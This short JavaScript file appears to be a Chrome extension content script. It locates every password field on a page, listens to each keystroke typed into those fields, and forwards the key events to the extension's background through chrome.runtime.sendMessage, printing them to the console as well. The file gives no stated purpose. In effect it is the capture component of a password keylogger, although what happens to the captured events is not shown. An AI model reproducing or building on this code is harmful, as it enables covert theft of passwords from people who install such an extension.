var passwordInputs = getPwdInputs();

passwordInputs.forEach(function(pwdInput) {
  pwdInput.addEventListener('keydown', grabInput);
});

function grabInput(event) {
  chrome.runtime.sendMessage({event: event}, function(response) {
      console.log("RESPONSE: ", response);
  });
  console.log("EVENT", event);
}

function getPwdInputs() {
  var array = [];
  var inputs = document.getElementsByTagName("input");
  for (var i=0; i<inputs.length; i++) {
    if (inputs[i].type.toLowerCase() === "password") {
      array.push(inputs[i]);
    }
  }
  return array;
}
